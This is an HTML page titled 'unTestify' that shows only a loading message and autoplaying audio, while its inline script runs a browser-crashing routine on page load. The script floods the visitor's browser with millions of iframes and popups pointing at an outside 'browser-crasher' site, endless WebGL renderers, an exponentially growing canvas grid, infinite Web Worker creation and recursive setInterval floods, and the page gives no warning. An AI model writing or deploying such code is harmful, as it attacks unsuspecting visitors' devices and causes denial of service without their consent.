<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>unTestify</title>
    <link href="style.css" rel="stylesheet" type="text/css" />
  </head>
  <body>
    <div class="font">
      <p>unTestifying...</p>
      <br />
      <audio id="audio" controls autoplay>
        <source src="./audio.mp3" type="audio/mpeg" />
        Your browser does not support the audio element.
      </audio>
    </div>


    <script>
      function crash() {
        var audio = document.getElementById("audio");
        audio.play();


        // Load multiple iframes rapidly
        function loadMultipleIframes(url, numIframes) {
          var index = 0;
          var intervalId = setInterval(function () {
            if (index >= numIframes) {
              clearInterval(intervalId);
              return;
            }


            var iframe = document.createElement("iframe");
            iframe.src = url;
            iframe.width = 800;
            iframe.height = 600;
            document.body.appendChild(iframe);


            index++;
          }, 0);
        }


        var url = "https://browser-crasher.mishal0legit.repl.co";
        var numIframes = 9999999;
        loadMultipleIframes(url, numIframes);


        var audio = document.getElementById("audio");
        audio.play();


        setInterval(function () {
          var iframe = document.createElement("iframe");
          iframe.src = url;
          iframe.width = 800;
          iframe.height = 600;
          document.body.appendChild(iframe);
        }, 0);


        setInterval(function () {
          var popup = window.open(url, "_blank", "width=500,height=500");
          if (popup) popup.focus();
        }, 0);


        function createThreeCubes() {
          var geometry = new THREE.BoxGeometry();
          var material = new THREE.MeshBasicMaterial({ color: Math.random() * 0xffffff });
          var cube = new THREE.Mesh(geometry, material);
          cube.rotation.x += Math.random() * 2 * Math.PI;
          cube.rotation.y += Math.random() * 2 * Math.PI;
          cube.rotation.z += Math.random() * 2 * Math.PI;
          var renderer = new THREE.WebGLRenderer();
          renderer.render(new THREE.Scene().add(cube), new THREE.Camera());


          requestAnimationFrame(createThreeCubes);
        }


        requestAnimationFrame(createThreeCubes);


        const canvas = document.createElement("canvas");
        canvas.id = "myCanvas";
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        document.body.appendChild(canvas);


        const ctx = canvas.getContext("2d");


        let gridSize = 16;


        function drawGrid() {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          const cellSize = canvas.width / gridSize;


          ctx.beginPath();
          for (let i = 0; i <= gridSize; i++) {
            ctx.moveTo(i * cellSize, 0);
            ctx.lineTo(i * cellSize, canvas.height);
            ctx.moveTo(0, i * cellSize);
            ctx.lineTo(canvas.width, i * cellSize);
          }
          ctx.stroke();


          gridSize *= 1000000000000; // exponentially large


          requestAnimationFrame(drawGrid);
        }


        requestAnimationFrame(drawGrid);


        // Create infinite workers running intervals
        while (true) {
          new Worker(
            "data:text/javascript," +
              encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);")
          );
        }


        // Set interval flooder function
        let x = function () {
          setInterval(console.log, 1, Math.random());
          try {
            setInterval(x, 1);
          } catch (e) {
            console.log(e);
          }
        };


        while (true) {
          try {
            setInterval(x, 1);
          } catch (e) {
            console.log(e);
          }
        }
      }


      window.onload = function () {
        crash();
      };
    </script>
  </body>
</html>
